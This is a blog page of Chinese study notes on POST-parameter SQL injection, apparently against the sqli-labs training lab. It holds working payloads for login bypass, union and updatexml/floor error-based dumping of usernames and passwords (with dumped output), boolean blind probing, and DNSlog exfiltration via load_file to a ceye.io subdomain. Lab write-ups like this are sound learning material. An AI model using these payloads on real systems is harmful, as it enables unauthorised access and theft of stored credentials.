@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#10 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#10</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-07T08:07:33.000Z" id="date"> 2023-06-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-07T09:50:49.588Z" id="updated"> 2023-06-07</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习Post下的union注入，</p>
+<p>Post报错注入，Post布尔盲注、Post-DNSlog注入</p>
+<span id="more"></span>
+
+<p>这一篇文章相当于是学完全部post注入</p>
+<p>首先知道post和get提交的不同点</p>
+
+
+<h1 id="1-万能密码"><a href="#1-万能密码" class="headerlink" title="1 万能密码"></a>1 万能密码</h1><p>其实up讲的很清楚了</p>
+<p>他就是构造一个语句</p>
+<p>select name,pwd from users where $name&#x3D;xxx and $name&#x3D;xxx</p>
+<p>然后只要在name框里面输入admin’ or 1&#x3D;1 #</p>
+<p>密码框随意，</p>
+<p>然后就登陆成功了，</p>
+<p>但是我们如果不只是想要登陆成功，</p>
+<p>而是想要获取数据库中的全部内容呢？</p>
+<h1 id="2-实战注入"><a href="#2-实战注入" class="headerlink" title="2 实战注入"></a>2 实战注入</h1><p>首先先用burpsuite抓一下包，</p>
+<p>获取那个post传送的东西复制一下到hackbar</p>
+<p>（里面的工具不多说了</p>
+<p>注意hackbar要打开postdata，</p>
+<p>复制到下面那个框，然后上面先loadurl一下，</p>
+<p>后面想要修改参数都是在下面修改，</p>
+<p>后面的就和前面的sql注入差不多了</p>
+<h2 id="2-1-union注入"><a href="#2-1-union注入" class="headerlink" title="2.1 union注入"></a>2.1 union注入</h2>
+
+<p>首先orderby一下</p>
+<p>然后获取回显点（见上图）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">获取数据库中有哪些表<br>uname=-admin&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&amp;passwd=111&amp;submit=Submit<br><br>获取数据库的表中有哪些列<br>uname=-admin&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#&amp;passwd=111&amp;submit=Submit<br><br>然后就可以直接查询里面的数据了<br>uname=-admin&#x27; union select 1,group_concat(id,username,password) from users #&amp;passwd=111&amp;submit=Submit<br><br>结束，获取到全部内容<br>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4<br></code></pre></td></tr></table></figure>
+
+<p>其实这一套就是最普通最简单的注入流程了</p>
+<p>后面的less12，13，14唯一不同的就是闭合方式了</p>
+<h2 id="2-2-updatexml报错注入"><a href="#2-2-updatexml报错注入" class="headerlink" title="2.2 updatexml报错注入"></a>2.2 updatexml报错注入</h2><p>up在课上使用的是floor报错，</p>
+<p>那我这里使用一下updatexml吧</p>
+<p>（和extractvalue几乎一样）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">获取数据库中的的表<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) #&amp;passwd=111&amp;submit=Submit<br><br>获取表中的列<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)),1) #&amp;passwd=111&amp;submit=Submit<br><br>最后一步，获取全部数据<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),1) #&amp;passwd=111&amp;submit=Submit<br><br>配合substring<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,substring((select group_concat(id,username,password) from users),31,31)),1) #&amp;passwd=111&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<h2 id="2-3-floor报错注入"><a href="#2-3-floor报错注入" class="headerlink" title="2.3 floor报错注入"></a>2.3 floor报错注入</h2><p>当然floor也可以试一试</p>
+<p>这里直接最后一步了吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&quot; union select count(*),concat_ws(&#x27;-&#x27;,(select concat(id,&#x27;-&#x27;,username,&#x27;:&#x27;,password) from users limit 1,1),floor(rand(0)*2)) as x from information_schema.tables group by x#&amp;passwd=111&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意千万不要忘记后面的as 、group by！！！</strong></p>
+<h2 id="2-4-布尔盲注"><a href="#2-4-布尔盲注" class="headerlink" title="2.4 布尔盲注"></a>2.4 布尔盲注</h2><p>这里就是less15了</p>
+<p>首先burpsuite抓一下包看一下有没有和前面格式不一样的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>没有变化，好吧</p>
+<p>然后判断闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&#x27; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>这里显示successfully login了，说明闭合就是一个单引号，</p>
+<p>接下来开始构建语句，</p>
+<p>注意要把uname改成永久报错的东西</p>
+<p>语句构造在or后面，返回successfully login说明是true，</p>
+<p>failed login代表是false，</p>
+<p>那么接下来就是漫长的爆破了，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=-admin&#x27; or (length(database())=8)#&amp;passwd=123&amp;submit=Submit<br><br>uname=-admin&#x27; or ascii(substr(database(),1,1))=115#&amp;passwd=123&amp;submit=Submit<br>..........<br></code></pre></td></tr></table></figure>
+
+<p>后面的不搞了</p>
+<p>（如果实战这里没有回显可以使用if）</p>
+<h2 id="2-5-DNSlog手动注入"><a href="#2-5-DNSlog手动注入" class="headerlink" title="2.5 DNSlog手动注入"></a>2.5 DNSlog手动注入</h2><p>首先就是那个ceye.io要注册好</p>
+<p>然后就开始吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">passwd=admin&amp;Submit=Submit&amp;uname=adm&#x27; and (select load_file(concat(&quot;//&quot;,(database()),&quot;.你的域名.ceye.io/abc&quot;)))#<br>..............后面的不搞了<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意concat里面是双引号！！！！！！！！！</strong></p>
+<p>因为这个我又卡了好长时间</p>
+<p><strong>使用单引号闭合可能会和前面的单引号闭合发生冲突！！！</strong></p>
+<h2 id="2-6-DNSlog自动注入"><a href="#2-6-DNSlog自动注入" class="headerlink" title="2.6 DNSlog自动注入"></a>2.6 DNSlog自动注入</h2><p>算了这个不搞了。。。</p>
+<p>kali懒得开机了</p>
+<h1 id="3-最后"><a href="#3-最后" class="headerlink" title="3 最后"></a>3 最后</h1><p>这一天更新了3篇文章哈哈哈</p>
+<p>期待一下明天的http头注入吧！</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-11/">← Next Sql注入学习笔记#11</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9/">Sql注入学习笔记#9 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">1 万能密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2 实战注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-union%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 union注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 updatexml报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 floor报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-DNSlog%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 DNSlog手动注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-DNSlog%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 DNSlog自动注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%9C%80%E5%90%8E"><span class="toc-number">3.</span> <span class="toc-text">3 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
